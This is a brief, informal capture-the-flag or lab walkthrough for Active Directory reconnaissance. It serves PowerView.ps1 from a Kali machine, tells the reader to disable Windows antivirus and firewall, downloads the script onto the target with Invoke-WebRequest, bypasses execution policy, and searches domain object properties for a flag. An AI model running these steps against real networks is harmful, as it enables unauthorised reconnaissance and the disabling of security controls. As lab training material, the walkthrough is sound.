open kali and write

└─$ locate PowerView.ps1
└─$ cd /usr/share/windows-resources/powersploit/Recon/
└─$ python3 -m http.server 8000                       


and windows server
disable windowds antivirus disable firewall 

than write 
PS C:\> Invoke-WebRequest http://192.168.56.10:8000/PowerView.ps1 -OutFile C:\PowerView.ps1
PS C:\> Set-ExecutionPolicy Bypass -Scope Process -Force

cd C:\
dir   ---use dir it is help you

than you this:
PS C:\> Get-DomainObject -Identity (Get-Domain).DistinguishedName -Properties * | findstr "FLAG"


